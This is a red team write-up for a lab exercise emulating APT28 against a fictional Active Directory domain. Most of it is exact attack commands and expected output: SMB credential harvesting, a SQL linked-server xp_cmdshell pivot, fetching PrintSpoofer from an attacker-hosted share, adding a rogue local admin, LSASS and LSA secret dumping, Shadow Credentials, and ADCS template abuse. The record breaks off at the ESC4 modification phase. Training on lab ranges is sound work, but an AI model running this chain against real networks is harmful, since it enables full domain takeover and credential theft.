# APT28 — Operation IRON MERIDIAN
## Red Team Exercise Write-Up — Range 1: Blind Trust

> **Classification:** RESTRICTED — Internal Red Team Use Only

| Field | Detail |
|---|---|
| **Environment** | 5 × Windows Server 2019 |
| **Domain** | cyberange.local / cyberange |
| **Emulated Actor** | APT28 (Forest Blizzard / STRONTIUM / GRU Unit 26165) |
| **Attack Chain** | Share Maze → SQL Pivot → PrintSpoofer → Shadow Credentials → ESC4/ESC1 → DCSync |
| **End Goal** | Full Domain Compromise — PKINIT-authenticated DCSync of cyberange.local |

---

## 1. Executive Summary

This document is the authoritative red team write-up for **Range 1: Operation IRON MERIDIAN — Blind Trust**. It covers every phase of the attack chain in detail — what each step does, why it works, the exact commands used, and what output to expect. It serves two purposes: as a technical guide for red team operators running the exercise, and as a reference for participants who need support understanding any stage of the attack.

The range emulates the documented tradecraft of **APT28** (also known as Forest Blizzard, STRONTIUM, and GRU Unit 26165), a Russia-nexus threat actor attributed to Russian military intelligence. APT28 is known for systematic credential harvesting from network resources, database exploitation for lateral movement, Active Directory identity manipulation, and certificate-based authentication abuse for long-dwell operations — all without relying on software exploits. This range replicates that pattern end to end.

The full attack chain runs across five hosts: an IIS file server hosting 15 SMB shares, a MSSQL primary database server, a MSSQL application server, an AD Certificate Services server, and the Domain Controller. Starting from anonymous SMB access to a share containing a buried credential, the chain terminates in a PKINIT-authenticated DCSync that extracts every credential hash in the **cyberange.local** domain — achieved entirely through misconfiguration and identity abuse.

### Attack Chain at a Glance

| Step | Source | Target | Technique | ATT&CK |
|---|---|---|---|---|
| 1 | Attacker (no creds) | SRV01-WEB | Enumerate 15 SMB shares, find svc_db creds buried in archive | T1083 / T1552.001 |
| 2 | svc_db (SQL login) | SRV02-DB → SRV03-APP | SQL linked server hop → xp_cmdshell as svc_app | T1021 / T1059.003 |
| 3 | svc_app (via SQL) | SRV03-APP | PrintSpoofer SYSTEM → create local admin → LSASS dump → svc_app hash | T1134 / T1003.001 |
| 4 | svc_app NT hash | DC01 | Shadow Credentials: write msDS-KeyCredentialLink → PKINIT as svc_adm | T1556 / T1558 |
| 5 | svc_adm | SRV04-CA → DC01 | ESC4: modify CorpAuth template → ESC1: request cert as Administrator → DCSync | T1649 / T1003.006 |

---

## 2. Lab Environment

### 2.1 Host Inventory

| Hostname | OS | Role | Key Vulnerability |
|---|---|---|---|
| DC01.cyberange.local | Windows Server 2019 | Domain Controller + DNS | Shadow Credentials ACL: svc_app has WriteProperty on svc_adm |
| SRV01-WEB.cyberange.local | Windows Server 2019 | IIS + SMB File Server | 15 SMB shares with 40+ decoy config files; real svc_db creds in 2 locations |
| SRV02-DB.cyberange.local | Windows Server 2019 | MSSQL Primary Database | svc_db is sysadmin; linked server to SRV03-APP with RPC OUT enabled |
| SRV03-APP.cyberange.local | Windows Server 2019 | MSSQL Application Server | Linked server target runs as svc_app (SeImpersonatePrivilege); LSASS unprotected |
| SRV04-CA.cyberange.local | Windows Server 2019 | AD Certificate Services | ESC4: svc_adm has WriteProperty on CorpAuth template → enables ESC1 |

### 2.2 Domain Accounts

| Account | Type | Group Membership | Purpose |
|---|---|---|---|
| svc_db | Service account | Domain Users, sysadmin on SRV02-DB | MSSQL service account — INITIAL TARGET |
| svc_app | Service account | Domain Users, sysadmin on SRV03-APP | Application server SQL service account — PIVOT TARGET |
| svc_adm | Service account | CertManagers | Administrative service account — ADCS ABUSE TARGET |
| jparker, slee, mchen … (×10) | User accounts | Domain Users | Regular staff |

### 2.3 Key Misconfigurations

Four deliberate misconfigurations chain together to enable full domain compromise from an anonymous SMB browse:

**Credentials buried in SMB archive files** — The real `svc_db` credentials appear in exactly two out of 40+ configuration files across 15 shares. Both are archived files in non-obvious subdirectories, designed to reward thorough enumeration and punish shallow scanning.

**SQL linked server with cross-server execution rights** — SRV02-DB holds a linked server definition pointing at SRV03-APP and configured to execute as `svc_app`. RPC OUT is enabled, meaning any sysadmin on SRV02-DB can run `EXEC AT [SRV03-APP]` to execute arbitrary commands on SRV03-APP in the `svc_app` security context — with no direct network credential required.

**svc_app WriteProperty on svc_adm's msDS-KeyCredentialLink** — This ACL was provisioned so the application service account could refresh its own Kerberos credentials. Because the ACL was placed on the wrong target object (`svc_adm` instead of `svc_app`), the application account can silently write a new authentication certificate to the administrative account's AD object — enabling a Shadow Credentials attack that bypasses the need to know `svc_adm`'s password.

**ESC4 on the CorpAuth certificate template** — `svc_adm` holds `WriteProperty` on the `CorpAuth` template object in AD, membership of the `CertManagers` group grants enrollment rights, and the template's `Enrollee Supplies Subject` flag is initially disabled. An attacker with `WriteProperty` can re-enable that flag, converting the template from safe to ESC1-exploitable — allowing any enrolling user to specify an arbitrary Subject Alternative Name, including `Administrator@cyberange.local`.

### 2.4 Boot Order

Boot **DC01** first and wait 90 seconds for AD DS and DNS to fully initialise. All four member servers can then boot in any order — each runs `Find-DC.ps1` at startup, which calculates the DC IP by substituting `.10` into its own subnet, sets DNS, and verifies LDAP connectivity before completing.

The lab is fully operational approximately 3–5 minutes after all five VMs are running. **Important:** SRV04-CA must complete its bootstrap before the Shadow Credentials attack is attempted in Step 4, as PKINIT requires an Enterprise CA to be operational in the domain.

---

## 3. Environment Setup

Before running any attack step, execute the setup function from the attack script. This must be done from a **Kali Linux** attacker machine with network access to the lab subnet.

### 3.1 Required Tools

| Tool | Purpose |
|---|---|
| impacket (mssqlclient, secretsdump, wmiexec, smbclient, smbserver, lookupsid, getTGT) | SQL access, credential dumping, remote execution, SMB operations |
| nxc (NetExec) | SMB enumeration, share spidering, lsassy module for LSASS dumping |
| nmap | Network discovery and port scanning |
| certipy-ad | Shadow Credentials attack, ADCS enumeration, ESC4/ESC1 exploitation, PKINIT authentication |
| PrintSpoofer64.exe | SeImpersonatePrivilege escalation to SYSTEM on SRV03-APP |

### 3.2 Running Setup

Make the attack script executable and launch it as root, then select option `[0]` from the interactive menu.

```bash
chmod +x attack_chain_s1.sh
sudo ./attack_chain_s1.sh
# From the menu, select [0] — Setup Environment
```

The setup function performs the following automatically:

**DC discovery** — Attempts DNS resolution of `DC01.cyberange.local` first. If that fails, scans the attacker's `/24` subnet for a host with port 88 (Kerberos) open. Falls back to manual IP entry if automated discovery fails.

**`/etc/resolv.conf` update** — Points the attacker's DNS resolver at DC01 so all FQDN lookups resolve through the domain's DNS server.

**`/etc/hosts` population** — Resolves all five FQDNs through domain DNS and writes them into `/etc/hosts` as a fallback.

**`/etc/krb5.conf` configuration** — Writes the Kerberos realm configuration pointing at DC01 as both KDC and admin server. This is required for all `certipy-ad` operations using PKINIT.

**Tool verification** — Checks all required Impacket components, nxc, nmap, certipy-ad, and PrintSpoofer64.exe are present and reports any that are missing.

**State persistence** — All extracted credentials and file paths are written to `/opt/redteam/loot/.state_s1` after each step. If a step is interrupted, re-running it reloads the last saved state. Use option `[S]` to view current state at any time.

---

## Step 1 — SMB Share Maze: Credential Discovery

**Target:** `SRV01-WEB.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1083 — File and Directory Discovery / T1552.001 — Credentials in Files

### What This Step Does

SRV01-WEB hosts 15 SMB shares — 11 accessible anonymously without credentials. Across those shares are over 40 configuration files: `.config`, `.xml`, `.ps1`, `.conf`, `.ini`, `.json`, `.yml`, and `.env` files containing usernames, passwords, API tokens, and connection strings. The overwhelming majority are decoys pointing at non-existent or irrelevant systems. Only two files contain the real, working `svc_db` credential.

The objective is to enumerate all shares, spider every accessible one for configuration files, download and examine the candidates, and identify the `svc_db` password before validating it directly against MSSQL on SRV02-DB.

### Why It Works

Anonymous SMB access is enabled on SRV01-WEB because the shares were originally set up for internal tool distribution — a common pattern in corporate environments where infrastructure teams need to make installers and configuration templates accessible without requiring users to have specific credentials. The `NullSessionShares` registry key explicitly names the accessible shares, `EveryoneIncludesAnonymous` is set, and `RestrictAnonymous` is disabled — all configurations made to enable the lab but mirroring real-world overpermissive share configurations.

The real credentials are in archival backup directories rather than the active configuration paths, because developers archived an old production config when migrating to a new framework. This is the realistic condition: credentials in files that were "just for reference" and forgotten.

### Phase 1a — Network Discovery

Scan the subnet to locate all live hosts and confirm key services are reachable before beginning share enumeration.

```bash
# Broad subnet discovery — locate all live lab hosts
nmap -sT -T4 --top-ports 1000 -oN /opt/redteam/loot/nmap_subnet.txt <SUBNET>.0/24

# Per-host service scans — enumerate relevant ports on each machine
nmap -sT -sV -p 53,88,135,389,445,636,3268,5985 -oN /opt/redteam/loot/nmap_DC01.txt DC01.cyberange.local
nmap -sT -sV -p 80,135,445,5985 -oN /opt/redteam/loot/nmap_SRV01-WEB.txt SRV01-WEB.cyberange.local
nmap -sT -sV -p 135,445,1433,5985 -oN /opt/redteam/loot/nmap_SRV02-DB.txt SRV02-DB.cyberange.local
nmap -sT -sV -p 135,445,1433,5985 -oN /opt/redteam/loot/nmap_SRV03-APP.txt SRV03-APP.cyberange.local
nmap -sT -sV -p 80,135,443,445,5985 -oN /opt/redteam/loot/nmap_SRV04-CA.txt SRV04-CA.cyberange.local
```

### Phase 1b — Enumerate All Shares

List all SMB shares on SRV01-WEB using a null session to identify what is accessible anonymously.

```bash
# List all shares via null session — identifies which of the 15 shares are accessible
nxc smb SRV01-WEB.cyberange.local -u '' -p '' --shares \
  2>&1 | tee /opt/redteam/loot/shares_null.txt
```

**Expected output — the 11 anonymous shares:**

```
Public$, HR-Docs, IT-Support, Marketing, Dev-Staging,
WebApps, Projects, Ops-Scripts, Training, Backup-Logs, App-Configs
```

The four shares requiring authentication (`Finance-Reports`, `Legal-Templates`, `Executive`, `Network-Configs`) are accessible with any valid domain credential but are not required for this attack chain.

### Phase 1c — Spider All Anonymous Shares for Config Files

Spider each anonymous share recursively, filtering for file extensions that are likely to contain credentials. This generates a map of all candidate files before downloading anything.

```bash
# Spider each accessible share — filter for credential-bearing file types
# Repeat for each of the 11 anonymous shares
for share in "Public$" "HR-Docs" "IT-Support" "Marketing" "Dev-Staging" \
             "WebApps" "Projects" "Ops-Scripts" "Training" "Backup-Logs" "App-Configs"; do
  nxc smb SRV01-WEB.cyberange.local -u '' -p '' \
    --share "$share" \
    --spider . \
    --regex '.*\.(config|xml|conf|ini|json|ps1|env|yml|cfg)$' \
    2>&1 | tee "/opt/redteam/loot/shares/spider_${share}.txt"
  sleep 1
done
```

### Phase 1d — Download Candidate Configuration Files

With the spider output identifying all config files, download the most likely credential-containing candidates. The two real credential locations are buried specifically in `WebApps` and `Ops-Scripts`.

```bash
mkdir -p /opt/redteam/loot/configs
cd /opt/redteam/loot/configs

# The most important files to retrieve — listed in order of likely interest
# Real creds are in the first two; all others are decoys worth examining for completeness

# *** REAL CREDS — production config archived in Q3 backup directory ***
echo -e "use WebApps\ncd archive\\2024-Q3\\corpapp.bak\nget web.config\nexit" | \
  impacket-smbclient SRV01-WEB.cyberange.local -no-pass

# *** REAL CREDS — database maintenance script with hardcoded password ***
echo -e "use Ops-Scripts\ncd Database\nget Weekly_DB_Maintenance.ps1\nexit" | \
  impacket-smbclient SRV01-WEB.cyberange.local -no-pass

# DECOYS — download and examine to understand the full noise landscape
echo -e "use WebApps\ncd current\\corpportal\nget web.config\nexit" | \
  impacket-smbclient SRV01-WEB.cyberange.local -no-pass

echo -e "use Ops-Scripts\ncd Monitoring\nget prtg_connector.conf\nexit" | \
  impacket-smbclient SRV01-WEB.cyberange.local -no-pass

echo -e "use IT-Support\ncd Configs\nget helpdesk_db.conf\nexit" | \
  impacket-smbclient SRV01-WEB.cyberange.local -no-pass
```

### Phase 1e — Extract the svc_db Credential

Search all downloaded files for the real `svc_db` credential. It appears in two distinct files — the `web.config` connectionString and the PowerShell maintenance script variable.

```bash
# Search web.config for the real connection string — svc_db password in the CorpAppDB entry
# The CorpPortalDB entry in the current web.config is a decoy (portal_readonly user)
grep -i 'svc_db\|password' web.config

# Search the maintenance script — $SqlPassword variable contains the plaintext credential
grep -oP '\$SqlPassword\s*=\s*"\K[^"]+' Weekly_DB_Maintenance.ps1

# Scan all downloaded files for any Password= pattern — shows the full decoy landscape
grep -rh -oP 'Password=\K[^;\"<]+' /opt/redteam/loot/configs/ | sort -u
```

**Expected real credential output:**

```
# From web.config connectionString (CorpAppDB entry):
User Id=svc_db;Password=Db@ccess2025!

# From Weekly_DB_Maintenance.ps1:
$SqlPassword = "Db@ccess2025!"
```

The decoy files contain credentials for `portal_readonly`, `hr_sync`, `it_helpdesk`, `dev_deploy`, `svc_finance`, `svc_monitor`, `svc_backup`, `exec_assistant`, `svc_project`, `svc_middleware`, and `svc_webapp` — all pointing at non-existent or irrelevant systems.

### Phase 1f — Validate the Credential Against MSSQL

Confirm `svc_db:Db@ccess2025!` authenticates to SQL Server on SRV02-DB before proceeding.

```bash
# Test the credential directly against MSSQL — successful connection confirms it is valid
impacket-mssqlclient \
  'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' \
  -windows-auth

# Once connected, verify sysadmin rights
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Expected output: 1
```

> **Step 1 Result:** `svc_db:Db@ccess2025!` — real credential found in `WebApps\archive\2024-Q3\corpapp.bak\web.config` and confirmed in `Ops-Scripts\Database\Weekly_DB_Maintenance.ps1`. MSSQL sysadmin access to SRV02-DB confirmed.

---

## Step 2 — SQL Linked Server Pivot

**Target:** `SRV02-DB.cyberange.local → SRV03-APP.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1021 — Remote Services / T1059.003 — Windows Command Shell

### What This Step Does

`svc_db` is sysadmin on SRV02-DB. A SQL Linked Server is configured from SRV02-DB pointing at SRV03-APP, mapped to the `svc_app` SQL login there, with RPC OUT enabled. This allows any sysadmin on SRV02-DB to execute SQL statements — including `xp_cmdshell` — on SRV03-APP in the `svc_app` security context, without needing to know `svc_app`'s password or authenticate to SRV03-APP directly.

The attacker connects to SRV02-DB, confirms the linked server exists, and uses `EXEC AT` to run commands on SRV03-APP. This confirms `svc_app` is the execution context and that `SeImpersonatePrivilege` is available, setting up the PrintSpoofer escalation in Step 3.

### Why It Works

Linked Servers in SQL Server are a legitimate feature for cross-instance query federation. The security misconfiguration here is the combination of `RPC OUT = true` (which enables `EXEC AT` and therefore `xp_cmdshell` via the linked server), a fixed security mapping that always authenticates as `svc_app` regardless of who initiates the query, and `xp_cmdshell` being enabled on SRV03-APP. This pattern is common in environments where a primary database server needs to invoke stored procedures on a secondary instance, and the linked server credentials are set up for convenience rather than least-privilege.

### Phase 2a — SQL Reconnaissance on SRV02-DB

Connect to SRV02-DB and enumerate the database instance, available databases, and linked server configuration.

```bash
# Create a SQL recon script
cat > /opt/redteam/sql_recon.sql << 'EOF'
SELECT @@SERVERNAME AS CurrentServer;
SELECT name FROM sys.databases;
SELECT name, data_source, is_rpc_out_enabled
  FROM sys.servers WHERE is_linked = 1;
SELECT * FROM CorpApp.dbo.Employees;
EOF

# Execute against SRV02-DB
impacket-mssqlclient \
  'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' \
  -windows-auth \
  -file /opt/redteam/sql_recon.sql \
  2>&1 | tee /opt/redteam/loot/sql_recon_srv02.txt
```

**Expected output — linked server confirmation:**

```
name        data_source                               is_rpc_out_enabled
SRV03-APP   SRV03-APP.cyberange.local\SQLEXPRESS      1
```

`is_rpc_out_enabled = 1` confirms `EXEC AT` and therefore remote `xp_cmdshell` execution is available.

### Phase 2b — Execute Commands on SRV03-APP via Linked Server

Use the `EXEC AT` syntax to run OS commands on SRV03-APP through the linked server. This confirms the execution context, hostname, and — critically — the presence of `SeImpersonatePrivilege`.

```bash
cat > /opt/redteam/sql_pivot.sql << 'EOF'
-- Confirm the remote server identity
EXEC ('SELECT @@SERVERNAME AS RemoteServer') AT [SRV03-APP];

-- Confirm who we are running as on SRV03-APP
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SRV03-APP];

-- Confirm the hostname
EXEC ('EXEC xp_cmdshell ''hostname''') AT [SRV03-APP];

-- Check for SeImpersonatePrivilege — required for PrintSpoofer
EXEC ('EXEC xp_cmdshell ''whoami /priv''') AT [SRV03-APP];

-- Check local administrators group
EXEC ('EXEC xp_cmdshell ''net localgroup Administrators''') AT [SRV03-APP];
EOF

impacket-mssqlclient \
  'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' \
  -windows-auth \
  -file /opt/redteam/sql_pivot.sql \
  2>&1 | tee /opt/redteam/loot/sql_pivot_results.txt
```

**Expected output:**

```
RemoteServer: SRV03-APP\SQLEXPRESS
whoami: cyberange\svc_app
hostname: SRV03-APP
whoami /priv: SeImpersonatePrivilege     Enabled
```

> **Step 2 Result:** Code execution on SRV03-APP as `cyberange\svc_app` confirmed via SQL linked server. `SeImpersonatePrivilege` is enabled — PrintSpoofer escalation is viable.

---

## Step 3 — PrintSpoofer Privilege Escalation + LSASS Credential Dump

**Target:** `SRV03-APP.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1134 — Access Token Manipulation / T1003.001 — OS Credential Dumping: LSASS Memory

### What This Step Does

`svc_app` holds `SeImpersonatePrivilege` because it runs the SQL Server service — a standard Windows behaviour for database services. The attacker uploads PrintSpoofer64.exe via an authenticated SMB share on the attacker machine (Windows blocks anonymous outbound SMB connections, so anonymous SMB cannot be used here), then executes it through `xp_cmdshell` via the linked server. PrintSpoofer abuses the Named Pipe impersonation mechanism to acquire a SYSTEM token.

As SYSTEM, a temporary local administrator account (`svc_maint`) is created on SRV03-APP and added to the local Administrators group. The attacker then uses this account to dump LSASS via `nxc`'s lsassy module, recovering the `svc_app` NT hash from memory. At the end of the step, the temporary account and the PrintSpoofer binary are deleted to reduce artefacts — though this itself generates additional log events for blue team analysis.

### Why It Works

`SeImpersonatePrivilege` allows a process to impersonate any security token presented to it via a named pipe. PrintSpoofer forces a privileged Windows service to connect to an attacker-controlled named pipe, capturing the SYSTEM token in the process. The escalation is reliable on Windows Server 2019 without any patching specifically targeting this class of vulnerability — it is a design-level behaviour of the Windows impersonation subsystem.

LSASS is unprotected on SRV03-APP: no RunAsPPL, no Credential Guard, and `WDigest UseLogonCredential = 1`. The `svc_app` account has an active logon session maintained by the SQL Server service itself, so its credentials are present in LSASS memory throughout the machine's uptime.

### Phase 3a — Start the Authenticated SMB Server

On the attacker machine, start an authenticated SMB share serving the directory containing PrintSpoofer64.exe. Authentication is required because Windows Server 2019 rejects anonymous SMB connections from non-domain-joined sources by default.

```bash
# Start the authenticated SMB server on the attacker machine
# Run this before executing the SQL upload commands
impacket-smbserver \
  -smb2support \
  -username att \
  -password att \
  share /opt/redteam/tools/ &
```

### Phase 3b — Upload PrintSpoofer via Linked Server xp_cmdshell

Use the SQL linked server to map the attacker SMB share, copy PrintSpoofer to SRV03-APP's Temp directory, and verify the upload.

```bash
cat > /opt/redteam/sql_upload.sql << EOF
-- Map the attacker SMB share with credentials (anonymous SMB would be rejected)
EXEC ('EXEC xp_cmdshell ''net use \\\\<ATTACKER_IP>\\share /user:att att''') AT [SRV03-APP];

-- Copy PrintSpoofer to a writable system directory
EXEC ('EXEC xp_cmdshell ''copy \\\\<ATTACKER_IP>\\share\\PrintSpoofer64.exe C:\\Windows\\Temp\\PrintSpoofer64.exe /Y''') AT [SRV03-APP];

-- Disconnect the share to reduce SMB connection artefacts
EXEC ('EXEC xp_cmdshell ''net use \\\\<ATTACKER_IP>\\share /delete /y''') AT [SRV03-APP];

-- Verify the file is present on the target
EXEC ('EXEC xp_cmdshell ''dir C:\\Windows\\Temp\\PrintSpoofer64.exe''') AT [SRV03-APP];
EOF

impacket-mssqlclient \
  'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' \
  -windows-auth \
  -file /opt/redteam/sql_upload.sql \
  2>&1 | tee /opt/redteam/loot/sql_upload_results.txt
```

### Phase 3c — Escalate to SYSTEM and Create a Local Administrator

Execute PrintSpoofer to acquire a SYSTEM token and use it to create a temporary local administrator account. The `LocalAccountTokenFilterPolicy` registry key is also set to permit remote PTH authentication with the local admin account.

```bash
cat > /opt/redteam/sql_privesc.sql << EOF
-- Confirm PrintSpoofer runs and returns SYSTEM
EXEC ('EXEC xp_cmdshell ''C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "whoami"''') AT [SRV03-APP];

-- Enable PTH with local accounts over SMB (required for nxc lsassy)
EXEC ('EXEC xp_cmdshell ''C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"''') AT [SRV03-APP];

-- Create a temporary local admin account
EXEC ('EXEC xp_cmdshell ''C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "net user svc_maint M@int2025! /add"''') AT [SRV03-APP];

-- Add to local Administrators group
EXEC ('EXEC xp_cmdshell ''C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "net localgroup Administrators svc_maint /add"''') AT [SRV03-APP];

-- Verify the account is in Administrators
EXEC ('EXEC xp_cmdshell ''net localgroup Administrators''') AT [SRV03-APP];
EOF

impacket-mssqlclient \
  'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' \
  -windows-auth \
  -file /opt/redteam/sql_privesc.sql \
  2>&1 | tee /opt/redteam/loot/sql_privesc_results.txt
```

### Phase 3d — Dump LSASS to Recover the svc_app Hash

With a local administrator account available, dump LSASS from the attacker machine using `nxc`'s lsassy module.

```bash
# Primary: nxc lsassy — dumps LSASS remotely without writing a file to disk
nxc smb SRV03-APP.cyberange.local \
  -u svc_maint -p 'M@int2025!' \
  --local-auth \
  -M lsassy \
  2>&1 | tee /opt/redteam/loot/lsassy_srv03.txt

# Extract the svc_app NT hash from the output
grep -i 'svc_app' /opt/redteam/loot/lsassy_srv03.txt
# SRV03-APP    445    SRV03-APP    svc_app    CYBERANGE    <NT_HASH>
```

### Phase 3e — Fallback: secretsdump for LSA Secrets

If lsassy does not return the svc_app hash (e.g., svc_app session ended), secretsdump can extract the service account password from the LSA Secrets section of the registry, where Windows stores the passwords of service accounts that run scheduled tasks and services.

```bash
# Fallback: secretsdump dumps SAM, LSA secrets, and cached credentials
impacket-secretsdump \
  './svc_maint:M@int2025!@SRV03-APP.cyberange.local' \
  2>&1 | tee /opt/redteam/loot/secretsdump_srv03.txt

# The svc_app password appears under the _SC_MSSQLSERVER$SQLEXPRESS LSA secret
grep -A5 '_SC_MSSQLSERVER' /opt/redteam/loot/secretsdump_srv03.txt
# _SC_MSSQLSERVER$SQLEXPRESS: cyberange\svc_app / AppSvc!2025
```

### Phase 3f — Clean Up the Temporary Account

Delete the temporary local admin account and the PrintSpoofer binary. This generates additional log events (`4726` user account deleted, `4733` member removed from group) which are useful forensic artefacts for blue team analysis.

```bash
cat > /opt/redteam/sql_cleanup.sql << EOF
EXEC ('EXEC xp_cmdshell ''C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c "net user svc_maint /delete"''') AT [SRV03-APP];
EXEC ('EXEC xp_cmdshell ''del C:\\Windows\\Temp\\PrintSpoofer64.exe /f''') AT [SRV03-APP];
EOF

impacket-mssqlclient \
  'cyberange.local/svc_db:Db@ccess2025!@SRV02-DB.cyberange.local' \
  -windows-auth \
  -file /opt/redteam/sql_cleanup.sql \
  2>&1 | tee /opt/redteam/loot/sql_cleanup_results.txt
```

> **Step 3 Result:** `svc_app` NT hash (and optionally cleartext password from LSA Secrets) recovered from LSASS on SRV03-APP. Temporary local admin account created and deleted — both events visible in Windows Security logs.

---

## Step 4 — Shadow Credentials Attack: svc_app → svc_adm

**Target:** `DC01.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1556 — Modify Authentication Process / T1558 — Steal or Forge Kerberos Tickets

### What This Step Does

`svc_app` has `WriteProperty` on the `msDS-KeyCredentialLink` attribute of `svc_adm` in Active Directory. This ACL enables a Shadow Credentials attack: the attacker writes a new RSA key credential to `svc_adm`'s AD object, then authenticates as `svc_adm` via Kerberos PKINIT using the matching private key. PKINIT is a Kerberos pre-authentication mechanism that uses a public key certificate rather than a password hash — after authenticating, the KDC returns both a TGT and the account's NT hash.

The result is full `svc_adm` access without ever knowing or changing the account's password, and without generating a failed authentication event. The only Windows event produced is `5136` (Directory Service object modification) on DC01 when the key credential is written.

### Why It Works

`msDS-KeyCredentialLink` is the Active Directory attribute that stores the public key credentials for Windows Hello for Business (WHfB). Writing to this attribute on another user's account allows the attacker to add their own key pair as a trusted credential for that account. Because PKINIT is natively supported by the Kerberos KDC on Server 2019 with an Enterprise CA present, the KDC will issue a TGT based on the certificate without requiring password validation.

The ACL misconfiguration — `WriteProperty` granted to `svc_app` on `svc_adm` rather than on `svc_app` itself — is the sole condition for this attack. No software vulnerability is involved.

### Phase 4a — Execute the Shadow Credentials Attack

`certipy-ad shadow auto` performs the entire Shadow Credentials chain in a single command: it adds the key credential, authenticates via PKINIT, retrieves the NT hash, and then removes the added key credential to restore the original state.

```bash
# Clean any existing certipy artefacts before running
rm -f /opt/redteam/*.pfx /opt/redteam/*.ccache /opt/redteam/*.key 2>/dev/null
cd /opt/redteam

# Shadow Credentials auto — uses svc_app hash to write key on svc_adm, authenticate, recover NT hash
# -u        : the account with the WriteProperty ACL (svc_app)
# -hashes   : svc_app NT hash from Step 3
# -account  : the target account to attack (svc_adm)
certipy-ad shadow auto \
  -u 'svc_app@cyberange.local' \
  -hashes ':<SVC_APP_HASH>' \
  -account 'svc_adm' \
  -dc-ip <DC_IP> \
  -target DC01.cyberange.local \
  2>&1 | tee /opt/redteam/loot/shadow_creds.txt
```

**Expected output from `shadow auto`:**

```
[*] Targeting user 'svc_adm'
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: <GUID>
[*] Patching the msDS-KeyCredentialLink attribute of svc_adm
[+] Successfully patched the attribute of the target object
[*] Authenticating as 'svc_adm' with the certificate
[*] Got TGT for svc_adm
[*] Removing the shadow credentials
[+] Cleaned up attribute
[*] NT hash for 'svc_adm': <SVC_ADM_HASH>
```

### Phase 4b — Manual PKINIT if shadow auto Clears the PFX

If `shadow auto` returns a hash but does not retain a PFX (it restores the key credential by default), run `shadow add` followed by `certipy-ad auth` to obtain a usable TGT for ADCS operations in Step 5.

```bash
# Step 1: Add the key credential and retain the PFX
certipy-ad shadow add \
  -u 'svc_app@cyberange.local' \
  -hashes ':<SVC_APP_HASH>' \
  -account 'svc_adm' \
  -dc-ip <DC_IP> \
  2>&1 | tee -a /opt/redteam/loot/shadow_creds.txt

# Step 2: Authenticate using the generated PFX — returns TGT and NT hash
certipy-ad auth \
  -pfx svc_adm.pfx \
  -dc-ip <DC_IP> \
  2>&1 | tee -a /opt/redteam/loot/shadow_creds.txt
```

### Phase 4c — Extract the Domain SID

The Domain SID is not needed for the ADCS steps, but is useful to record for reference. Extract it from an authenticated lookupsid query.

```bash
# Query the DC for the Domain SID using svc_db credentials
impacket-lookupsid \
  'cyberange.local/svc_db:Db@ccess2025!@DC01.cyberange.local' 0 \
  2>&1 | grep -oP 'S-1-5-21-[\d-]+'
```

> **Step 4 Result:** `svc_adm` NT hash recovered via Shadow Credentials. `svc_adm` TGT and/or PFX available for ADCS operations. `svc_adm` is a member of `CertManagers` and holds `WriteProperty` on the `CorpAuth` certificate template — conditions confirmed for Step 5.

---

## Step 5 — ADCS ESC4 → ESC1: Certificate Template Abuse → Domain Admin → DCSync

**Target:** `SRV04-CA.cyberange.local → DC01.cyberange.local` &nbsp;|&nbsp; **MITRE:** T1649 — Steal or Forge Authentication Certificates / T1003.006 — DCSync

### What This Step Does

`svc_adm` holds `WriteProperty` on the `CorpAuth` certificate template object in Active Directory and is a member of the `CertManagers` group, which grants enrollment rights on that template. The `CorpAuth` template currently has `Enrollee Supplies Subject` disabled — it is not directly exploitable as ESC1. This is ESC4: the ability to modify template attributes.

The attacker uses `certipy-ad template` to write the default certificate template configuration, which re-enables the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag (`msPKI-Certificate-Name-Flag = 1`). With this flag set, any enrolling user can specify an arbitrary Subject Alternative Name in their certificate request — this is ESC1. The attacker then requests a certificate specifying `Administrator@cyberange.local` as the UPN in the SAN field. The CA issues the certificate without verifying that the requester actually is Administrator.

The resulting certificate is used with `certipy-ad auth` to perform PKINIT authentication as Administrator, obtaining both a TGT and the Administrator NT hash. DCSync completes the chain.

### Why It Works

The `CorpAuth` template's `Enrollee Supplies Subject` flag was disabled as a security control during initial setup — the CA administrator intended to prevent arbitrary SAN specification. However, because `svc_adm` has `WriteProperty` on the template object itself (not just enrollment rights), the attacker can re-enable that flag directly in Active Directory without going through the CA management console. The CA reads the current template configuration at certificate issuance time, so a template modification takes effect immediately for new requests.

The chain works because AD CS trusts the template configuration stored in AD — it does not independently validate whether the template has been modified maliciously.

### Phase 5a — Enumerate the ADCS Configuration

Before modifying anything, enumerate the ADCS environment to confirm the CA name, the template name, the CA host, and the current template vulnerability state.

```bash
# Remove any stale certipy artefacts before proceeding
rm -f /opt/redteam/*.pfx /opt/redteam/*.json /opt/redteam/*.key 2>/dev/null
cd /opt/redteam

# Build credential argument — use hash from Step 4 if available, fall back to password
# If SVC_ADM_HASH is set:
ADM_CRED="-u svc_adm@cyberange.local -hashes :<SVC_ADM_HASH>"
# If only password is available:
# ADM_CRED="-u svc_adm@cyberange.local -p Adm1nSvc#2025"

# Enumerate all ADCS templates and vulnerabilities
certipy-ad find $ADM_CRED \
  -dc-ip <DC_IP> \
  -stdout \
  2>&1 | tee /opt/redteam/loot/certipy_enum.txt

# Confirm:
# CA Name: cyberange-CA
# CA Host: SRV04-CA.cyberange.local
# Template: CorpAuth — currently shows ESC4 (WriteProperty) but NOT ESC1
```

### Phase 5b — ESC4: Modify the CorpAuth Template to Enable Enrollee Supplies Subject

